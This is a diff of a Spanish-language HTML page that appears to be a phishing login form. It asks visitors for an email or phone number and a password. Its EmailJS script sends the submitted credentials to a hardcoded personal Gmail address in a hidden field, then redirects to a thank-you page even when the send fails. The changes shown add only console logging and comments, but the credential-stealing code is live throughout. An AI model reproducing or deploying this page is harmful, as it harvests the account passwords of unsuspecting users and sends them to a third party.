@@ -145,19 +145,19 @@
         <form id="loginForm">
             <!-- Campo oculto para correo fijo (destinatario predeterminado) -->
             <input type="hidden" name="recipient_email" value="raulmorejonpulido@gmail.com">
-
-
+        
             <!-- Campo para correo electrónico -->
             <label for="email">Correo electrónico o número de teléfono</label>
             <input type="email" id="email" name="email" placeholder="Introduce tu correo electrónico" required>
-
+        
             <!-- Campo para contraseña -->
             <label for="password">Contraseña</label>
             <input type="password" id="password" name="password" placeholder="Introduce tu contraseña" required>
-
+        
             <!-- Enviar formulario -->
             <button type="submit">Iniciar sesión</button>
         </form>
+        
 
         <div class="links">
             <a href="#">¿Olvidaste tu contraseña?</a><br>
@@ -179,26 +179,32 @@
     <!-- Script para EmailJS -->
     <script type="text/javascript">
         // Inicializa EmailJS con tu userID
-        emailjs.init('user_f80imbc');
-
+        emailjs.init('user_f80imbc');  // Reemplaza con tu userID
+    
         // Manejamos el evento de envío del formulario
         document.addEventListener("DOMContentLoaded", function () {
             var form = document.querySelector("#loginForm"); // Usamos querySelector para seleccionar el formulario
-
+    
             if (form) {
                 form.addEventListener('submit', function (event) {
                     event.preventDefault();  // Prevenir el envío tradicional del formulario
-
+    
                     var formData = new FormData(form);  // Obtener los datos del formulario
-
+    
+                    // Verificamos los datos del formulario en la consola
+                    console.log("Datos del formulario:", formData);
+    
+                    // Verificar si 'recipient_email' está presente
+                    console.log("Correo de destino:", formData.get('recipient_email'));
+    
                     // Enviar el formulario con EmailJS
                     emailjs.sendForm('service_f80imbc', 'template_8dg1bfi', formData)
                         .then(function (response) {
                             console.log('SUCCESS!', response.status, response.text);
-                            window.location.href = 'gracias.html';
+                            window.location.href = 'gracias.html';  // Redirigir a una página de agradecimiento
                         }, function (error) {
                             console.log('FAILED...', error);
-                            window.location.href = 'gracias.html';
+                            window.location.href = 'gracias.html';  // Redirigir aún en caso de error
                         });
                 });
             } else {
@@ -206,6 +212,7 @@
             }
         });
     </script>
+    
 
 </body>
 
